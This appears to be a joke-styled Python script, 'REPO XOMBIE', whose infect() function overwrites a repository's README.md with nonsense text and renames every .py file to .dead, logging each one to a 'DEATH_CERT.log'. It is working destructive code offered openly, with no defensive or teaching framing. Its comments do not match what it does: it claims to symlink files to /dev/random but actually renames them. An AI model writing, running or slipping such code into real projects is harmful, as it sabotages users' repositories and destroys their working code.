# REPO XOMBIE (undead code liberation)
# Automatically migrates repos to /dev/null with artistic license

import os
import random
from datetime import datetime

def infect(repo_path):
    with open(os.path.join(repo_path, 'README.md'), 'w') as f:
        f.write(f"# GHOSTED REPO {datetime.now().strftime('%Y%m%d')}\n")
        f.write("This repository has transcended to spiritual CI/CD\n\n")
        f.write("```\n")
        f.write(f"Kaboom detected: {random.randint(0, 0xDEADBEEF)}\n")
        f.write("Black hole entropy: 解読不能\n")
        f.write("Libitina 波が来ます\n```")

    # Symlink all files to /dev/random
    for root, dirs, files in os.walk(repo_path):
        for file in files:
            if file.endswith('.py'):
                os.rename(os.path.join(root, file), 
                         f"{os.path.join(root, file)}.dead")
                with open(os.path.join(root, "DEATH_CERT.log"), 'a') as f:
                    f.write(f"{file} relocated to digital heaven at {datetime.now()}\n")

if __name__ == "__main__":
    print("ERROR: Run with --blood-ritual flag to begin repo exorcism")
    print("|| Press any key to terminal your existence ||")
